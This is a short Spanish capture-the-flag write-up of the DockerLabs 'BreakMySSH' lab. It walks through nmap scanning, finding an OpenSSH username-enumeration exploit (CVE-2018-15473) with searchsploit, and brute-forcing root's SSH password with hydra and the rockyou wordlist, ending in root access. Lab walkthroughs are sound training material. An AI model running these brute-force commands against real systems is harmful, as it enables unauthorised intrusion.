# BreakMySSH
https://dockerlabs.es

*23/5/2024*

## ENUMERACION

```
┌──(kali㉿kali)-[~]
└─$ nmap -p- --open --min-rate 5000 -sCV 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-23 13:42 EDT
Nmap scan report for 172.17.0.2
Host is up (0.00044s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 1a:cb:5e:a3:3d:d1:da:c0:ed:2a:61:7f:73:79:46:ce (RSA)
|   256 54:9e:53:23:57:fc:60:1e:c0:41:cb:f3:85:32:01:fc (ECDSA)
|_  256 4b:15:7e:7b:b3:07:54:3d:74:ad:e0:94:78:0c:94:93 (ED25519)
```

## ANALISIS DE VULNERABILIDADES

```
└─$ searchsploit OpenSSH 7.7               
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                          | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                    | linux/remote/45210.py
OpenSSH < 7.7 - User Enumeration (2)                                              | linux/remote/45939.py
---------------------------------------------------------------------------------- ---------------------------------
```

```
└─$ searchsploit -m linux/remote/45233.py
  Exploit: OpenSSH 2.3 < 7.7 - Username Enumeration
      URL: https://www.exploit-db.com/exploits/45233
     Path: /usr/share/exploitdb/exploits/linux/remote/45233.py
    Codes: CVE-2018-15473
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/kali/DOCKERLABS/breakmyssh/exploit/45233.py
```

Vemos que podemos enumerar los usuarios del servicio OpenSSH aprovechandonos de una vulnerabilidad

## EXPLOTACION
Vamos a utilizar el usuario root con el diccionario de rockyou para hacer un ataque de fuerza bruta

```
┌──(kali㉿kali)-[~/DOCKERLABS/breakmyssh/exploit]
└─$ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-23 13:53:34
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/

[22][ssh] host: 172.17.0.2   login: root   password: estrella
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-23 13:54:08

```
```
┌──(kali㉿kali)-[~/DOCKERLABS/breakmyssh/exploit]
└─$ ssh root@172.17.0.2                  
root@172.17.0.2's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@c52ddc237f43:~# whoami
root
root@c52ddc237f43:~# 

```
